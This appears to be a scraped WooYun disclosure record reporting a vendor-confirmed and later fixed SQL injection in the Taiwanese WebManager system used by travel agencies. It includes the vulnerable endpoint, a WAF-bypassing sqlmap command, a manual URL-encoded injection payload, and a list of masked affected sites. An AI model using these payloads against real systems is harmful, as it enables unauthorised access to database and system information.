{"id": 82445, "wybug_id": "wooyun-2015-0151043", "wybug_title": "台湾WebManager-管理系統存在SQL注入影响众多旅行社(附大量案例)（臺灣地區）", "wybug_corp": "Hitcon台湾互联网漏洞报告平台", "wybug_author": "独孤求败", "wybug_date": "2015-11-24 11:14", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "\t\t\t\t\t\t\t\t已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-17：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述：  详细说明：  台湾WebManager-管理系統存在SQL注入影响众多旅行社(附大量案例)。说明：乌云YY-2012发过这个系统的POST注入，还上过首页吧???而且很鸡肋，厂商回复说：目前測試所列案例僅有少數存在SQL Injection，但我这个注入简单粗暴（GET注入），只要有案例，存在漏洞文件，就一定存在注入，手工和工具两种方法撸起。说了这么多我也想上首页！！！上首页.上首页.上首页.重要的是说三遍。存在waf,手工和工具均绕过！(手工为主)注入漏洞（ＧＥＴ注入）文件：/include/get_pax_dtl.asp?pax_cd=1单引号注入报错：**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1'\n\n工具注入：使用--tamper space2comment 绕过waf即可。证明：D:\\py\\sqlmap>sqlmap.py -u **.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1 --tamper space2comment \n\n\n\n给出部分案例，更多案例见YY-2012的漏洞：http://**.**.**.**/bugs/wooyun-2010-0120433案例如下:**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1http://**.**.**.**:8080/include/get_pax_dtl.asp?pax_cd=1http://**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1http://**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1http://**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1http://**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1http://**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1http://**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1http://**.**.**.**:8000//include/get_pax_dtl.asp?pax_cd=1**.**.**.**:8000//include/get_pax_dtl.asp?pax_cd=1   漏洞证明：  手工注入绕过语句：可注入数据库和系统信息\nadmin%27%20and%20@@version%3E0%20and%20%27%27=%27admin%27%20and%20user%3E0%20and%20%27%27=%27\n五个案例演示：**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1admin%27%20and%20@@version%3E0%20and%20%27%27=%27\n\n**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1\n\n**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1\n\n**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1\n\n**.**.**.**:8000/include/get_pax_dtl.asp?pax_cd=1\n\n\n\n......   修复方案：  如果上了首页，请给20rank？漏洞真实存在！   版权声明：转载请注明来源 独孤求败@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-11-27 01:44 厂商回复： 感謝通報 最新状态： 2016-01-05：確認修復  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}